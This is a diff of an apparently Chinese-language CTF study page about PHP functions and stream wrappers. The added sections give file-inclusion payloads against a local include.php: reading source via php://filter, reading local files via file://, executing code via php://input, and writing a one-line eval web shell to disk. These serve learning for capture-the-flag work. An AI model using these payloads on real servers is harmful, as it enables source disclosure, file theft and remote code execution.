@@ -2076,7 +2076,7 @@
 <p><a href="ftp://ftp.is.co.za/rfc/rfc1808.txt">ftp://ftp.is.co.za/rfc/rfc1808.txt</a>   </p>
 <p><a href="http://www.ietf.org/rfc/rfc2396.txt">http://www.ietf.org/rfc/rfc2396.txt</a>    </p>
 <p>ldap://[2001:db8::7]/c=GB?objectClass?one    </p>
-<p>mailto:<a href="mailto:&#74;&#x6f;&#104;&#110;&#46;&#x44;&#111;&#x65;&#x40;&#x65;&#120;&#x61;&#x6d;&#x70;&#x6c;&#101;&#46;&#x63;&#x6f;&#x6d;">&#74;&#x6f;&#104;&#110;&#46;&#x44;&#111;&#x65;&#x40;&#x65;&#120;&#x61;&#x6d;&#x70;&#x6c;&#101;&#46;&#x63;&#x6f;&#x6d;</a>    </p>
+<p>mailto:<a href="mailto:&#x4a;&#x6f;&#104;&#x6e;&#46;&#x44;&#x6f;&#x65;&#x40;&#x65;&#x78;&#97;&#109;&#112;&#x6c;&#x65;&#x2e;&#99;&#111;&#109;">&#x4a;&#x6f;&#104;&#x6e;&#46;&#x44;&#x6f;&#x65;&#x40;&#x65;&#x78;&#97;&#109;&#112;&#x6c;&#x65;&#x2e;&#99;&#111;&#109;</a>    </p>
 <p>news:comp.infosystems.<a href="http://www.servers.unix/">www.servers.unix</a>    </p>
 <p>tel:+1-816-555-1212    </p>
 <p>telnet://192.0.2.16:80/    </p>
@@ -2509,8 +2509,7 @@
 <p>数组中的每个元素都是文件中相应的一行，包括换行符在内</p>
 </blockquote>
 <ul>
-<li><strong>语法</strong>：<code>file(path,include_path,context)</code></li>
-</ul>
+<li><p><strong>语法</strong>：<code>file(path,include_path,context)</code></p>
 <table>
 <thead>
 <tr>
@@ -2531,13 +2530,14 @@
 <td align="left">可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 NULL，则忽略。</td>
 </tr>
 </tbody></table>
+</li>
+</ul>
 <h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h4><blockquote>
 <p>file_get_contents() 把整个文件读入一个字符串中</p>
 <p>该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能</p>
 </blockquote>
 <ul>
-<li><strong>语法</strong>：<code>file_get_contents(path,include_path,context,start,max_length)</code></li>
-</ul>
+<li><p><strong>语法</strong>：<code>file_get_contents(path,include_path,context,start,max_length)</code></p>
 <table>
 <thead>
 <tr>
@@ -2566,6 +2566,50 @@
 <td align="left">可选。规定读取的字节数。该参数是 PHP 5.1 中新增的。</td>
 </tr>
 </tbody></table>
+</li>
+</ul>
+<h4 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a>fopen()</h4><blockquote>
+<p>fopen() 函数打开一个文件或 URL</p>
+<p>如果 fopen() 失败，它将返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 ‘@’ 来隐藏错误输出</p>
+</blockquote>
+<ul>
+<li><p><strong>语法</strong>：<code>fopen(filename,mode,include_path,context)</code></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>filename</td>
+<td>必需。规定要打开的文件或 URL。</td>
+</tr>
+<tr>
+<td>mode</td>
+<td>必需。规定您请求到该文件/流的访问类型。可能的值：  “r” （只读方式打开，将文件指针指向文件头）     “r+” （读写方式打开，将文件指针指向文件头）     “w” （写入方式打开，清除文件内容，如果文件不存在则尝试创建之）     “w+” （读写方式打开，清除文件内容，如果文件不存在则尝试创建之）     “a” （写入方式打开，将文件指针指向文件末尾进行写入，如果文件不存在则尝试创建之）     “a+” （读写方式打开，通过将文件指针指向文件末尾进行写入来保存文件内容）     “x” （创建一个新的文件并以写入方式打开，如果文件已存在则返回 FALSE 和一个错误）     “x+” （创建一个新的文件并以读写方式打开，如果文件已存在则返回 FALSE 和一个错误）</td>
+</tr>
+<tr>
+<td>include_path</td>
+<td>可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 ‘1’。</td>
+</tr>
+<tr>
+<td>context</td>
+<td>可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。</td>
+</tr>
+</tbody></table>
+</li>
+<li><p><strong>示例</strong>：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = fopen(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = fopen(<span class="string">&quot;/home/test/test.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = fopen(<span class="string">&quot;/home/test/test.gif&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = fopen(<span class="string">&quot;http://www.example.com/&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = fopen(<span class="string">&quot;ftp://user:password@example.com/test.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>提示</strong>：</p>
+<p>当书写一个文本文件时，请确保您使用了正确的行结束符！</p>
+<p>在 Unix 系统中，行结束符为 \n；在 Windows 系统中，行结束符为 \r\n；在 Macintosh 系统中，行结束符为 \r</p>
+<p>Windows 系统中提供了一个文本转换标记 “t” ，可以透明地将 \n 转换为  \r\n</p>
+<p>您还可以使用 “b” 来强制使用二进制模式，这样就不会转换数据</p>
+<p>为了使用这些标记，请使用 “b” 或者 “t” 来作为 mode  参数的最后一个字符</p>
+</li>
+</ul>
 <h4 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h4><blockquote>
 <p>intval() 函数用于获取变量的整数值</p>
 <p>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1</p>
@@ -2616,8 +2660,7 @@
 <p>md5() 函数不能处理数组，数组都返回 null，md5(a[]) 结果为 null</p>
 </blockquote>
 <ul>
-<li><strong>语法</strong>：<code>md5(string,raw)</code></li>
-</ul>
+<li><p><strong>语法</strong>：<code>md5(string,raw)</code></p>
 <table>
 <thead>
 <tr>
@@ -2634,7 +2677,7 @@
 <td align="left">可选。规定十六进制或二进制输出格式：TRUE - 原始 16 字符二进制格式FALSE - 默认。32 字符十六进制数</td>
 </tr>
 </tbody></table>
-<ul>
+</li>
 <li><p><strong>漏洞</strong>：</p>
 <ul>
 <li><p><code>$_GET[a] != $_GET[b] &amp;&amp; md5($_GET[a]) == md5($_GET[b])</code></p>
@@ -2749,8 +2792,7 @@
 <p>substr() 函数返回字符串的一部分</p>
 </blockquote>
 <ul>
-<li><strong>语法</strong>：<code>substr(string,start,length)</code></li>
-</ul>
+<li><p><strong>语法</strong>：<code>substr(string,start,length)</code></p>
 <table>
 <thead>
 <tr>
@@ -2759,18 +2801,20 @@
 </tr>
 </thead>
 <tbody><tr>
-<td align="left"><em>string</em></td>
+<td align="left">string</td>
 <td align="left">必需。规定要返回其中一部分的字符串。</td>
 </tr>
 <tr>
-<td align="left"><em>start</em></td>
+<td align="left">start</td>
 <td align="left">必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始负数 - 在从字符串结尾的指定位置开始0 - 在字符串中的第一个字符处开始</td>
 </tr>
 <tr>
-<td align="left"><em>length</em></td>
+<td align="left">length</td>
 <td align="left">可选。规定要返回的字符串长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回负数 - 从字符串末端返回</td>
 </tr>
 </tbody></table>
+</li>
+</ul>
 <h4 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h4><blockquote>
 <p>system() 函数可以执行系统命令如<code>ls</code>，<code>cat</code>等</p>
 </blockquote>
@@ -2789,12 +2833,199 @@
 <p>访问各个输入/输出流（I/O streams） </p>
 </blockquote>
 <ul>
-<li>php://filter</li>
-<li>php://input</li>
+<li><p><strong>条件</strong>：</p>
+<ul>
+<li><code>allow_url_fopen</code>: off / on</li>
+<li><code>allow_url_include</code>: 仅<code>php://input</code>，<code>php://stdin</code>，<code>php://memory</code>，<code>php://temp</code>需要 on</li>
+</ul>
+</li>
+<li><p><strong>作用</strong>：<br><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p>
+</li>
+<li><p><strong>说明</strong>：<br>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>php://filter</strong></td>
+<td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>
+</tr>
+<tr>
+<td><strong>php://input</strong></td>
+<td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td>
+</tr>
+<tr>
+<td>php://output</td>
+<td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
+</tr>
+<tr>
+<td>php://fd</td>
+<td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td>
+</tr>
+<tr>
+<td>php://memory php://temp</td>
+<td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td>
+</tr>
+</tbody></table>
+</li>
+<li><p><strong><code>php://filter</code>参数详解</strong></p>
+<p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p>
+<table>
+<thead>
+<tr>
+<th>php://filter 参数</th>
+<th>描述</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>resource=&lt;要过滤的数据流&gt;</td>
+<td>必须项。它指定了你要筛选过滤的数据流。</td>
+<td></td>
+</tr>
+<tr>
+<td>read=&lt;读链的过滤器&gt;</td>
+<td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td>
+<td>*）分隔。</td>
+</tr>
+<tr>
+<td>write=&lt;写链的过滤器&gt;</td>
+<td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td>
+<td>）分隔。</td>
+</tr>
+<tr>
+<td>&lt;; 两个链的过滤器&gt;</td>
+<td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td>
+<td></td>
+</tr>
+</tbody></table>
+</li>
+<li><p><strong>可用的过滤器列表（4类）</strong></p>
+<p>  此处列举主要的过滤器类型，详细内容请参考：<a href="https://link.segmentfault.com/?enc=IPF2BSefM7SBjmi0ttQYeg==.zeK4TY2jJx/GarwqUVrwoEXvwoKL5dqbqmObqrDb+zRVTE/NG/D35TwCx6P9E/Rk">https://www.php.net/manual/zh/filters.php</a></p>
+<table>
+<thead>
+<tr>
+<th>字符串过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>string.rot13</td>
+<td>等同于<code>str_rot13()</code>，rot13变换</td>
+</tr>
+<tr>
+<td>string.toupper</td>
+<td>等同于<code>strtoupper()</code>，转大写字母</td>
+</tr>
+<tr>
+<td>string.tolower</td>
+<td>等同于<code>strtolower()</code>，转小写字母</td>
+</tr>
+<tr>
+<td>string.strip_tags</td>
+<td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>转换过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>convert.base64-encode &amp; convert.base64-decode</td>
+<td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td>
+</tr>
+<tr>
+<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
+<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>压缩过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>zlib.deflate &amp; zlib.inflate</td>
+<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
+</tr>
+<tr>
+<td>bzip2.compress &amp; bzip2.decompress</td>
+<td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>加密过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>mcrypt.*</td>
+<td>libmcrypt 对称加密算法</td>
+</tr>
+<tr>
+<td>mdecrypt.*</td>
+<td>libmcrypt 对称解密算法</td>
+</tr>
+</tbody></table>
+</li>
+<li><p><strong>示例</strong>：</p>
+<ol>
+<li><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>php://input + [POST DATA]</code>执行php代码</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>若有写入权限，写入一句话木马</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php fputs(fopen(&#x27;1juhua.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+<li><p><strong>参考</strong>：<a href="https://link.segmentfault.com/?enc=K3qJ/DOgGiR+OqhbUcb7tw==.JR434ibQXleGwDxbf/WxUGD1SYsOtm2/0pE9tsQYjJUEQQnUmT8CrodnbemMXBiN">https://php.net/manual/zh/wrappers.php.php</a></p>
+</li>
 </ul>
 <h4 id="file-1"><a href="#file-1" class="headerlink" title="file://"></a>file://</h4><blockquote>
 <p>访问本地文件系统 </p>
 </blockquote>
+<ul>
+<li><p><strong>条件</strong>：</p>
+<ul>
+<li><code>allow_url_fopen</code>: off / on</li>
+<li><code>allow_url_include</code> : off / on</li>
+</ul>
+</li>
+<li><p><strong>作用</strong>：<br>用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p>
+</li>
+<li><p><strong>说明</strong>：<br><code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows  盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI  的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path </code>会可选地搜索，也作为相对的路径。</p>
+</li>
+<li><p><strong>用法</strong>：</p>
+  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;path&#x2F;to&#x2F;file.ext</span><br><span class="line">relative&#x2F;path&#x2F;to&#x2F;file.ext</span><br><span class="line">fileInCwd.ext</span><br><span class="line">C:&#x2F;path&#x2F;to&#x2F;winfile.ext</span><br><span class="line">C:\path\to\winfile.ext</span><br><span class="line">\\smbserver\share\path\to\winfile.ext</span><br><span class="line">file:&#x2F;&#x2F;&#x2F;path&#x2F;to&#x2F;file.ext</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>示例</strong>：</p>
+<ol>
+<li><p><code>file://[文件的绝对路径和文件名]</code></p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>[文件的相对路径和文件名]</code></p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=./phpinfo.txt</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>[http://网络路径和文件名]</code></p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+</li>
+</ul>
 <h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4><blockquote>
 <p>PHP 归档 </p>
 </blockquote>
